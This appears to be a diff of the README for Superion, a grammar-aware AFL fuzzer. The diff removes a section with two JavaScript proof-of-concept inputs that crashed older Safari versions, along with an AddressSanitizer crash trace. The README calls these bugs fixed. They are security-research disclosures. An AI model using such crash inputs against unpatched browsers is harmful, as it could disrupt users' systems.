@@ -6,46 +6,6 @@ Superion mainly adds a mutation strategy to AFL. The mutation strategy first par
 
 The parsing ability of Superion is provided by ANTLR (https://www.antlr.org/), which can automatically generate a parser given the grammar file. 
 
-## Some harmless POCs
-
-Here we listed some harmless bugs we found using Superion, which is either fixed for a long time span or hard to be exploited. The following two POCs can crash older version of Safari browser and now fixed by the developer.
-
-```
-function f(eval){
-    eval(0x12345678);
-    f(function(){});
-}
-f(function(){});
-
-==27305==ERROR: AddressSanitizer: SEGV on unknown address 0x12345688 (pc 0xabc04b1f bp 0xbfb2b9d8 sp 0xbfb2b9a0 T0)
-    #0 0xabc04b1e  (<unknown module>)
-```
-
-```
-class A { };
-
-class B extends A {
-    constructor(a, b) {
-        var f = () => b ? this : {};
-        if (a) {
-            var val = f() == super();
-        } else {
-            super();
-            var val = f();
-        }
-    }
-};
-
-for (var i=0; i < 10000; i++) {
-    try {
-        new B(true, true);
-    } catch (e) {
-    }
-    var a = new B(false, true);
-    var c = new B(true, false);
-}
-```
-
 ## Building Superion
 
 The following build instructions are tested on Ubuntu 16.04 with gcc-5.4.0 and clang-3.8.
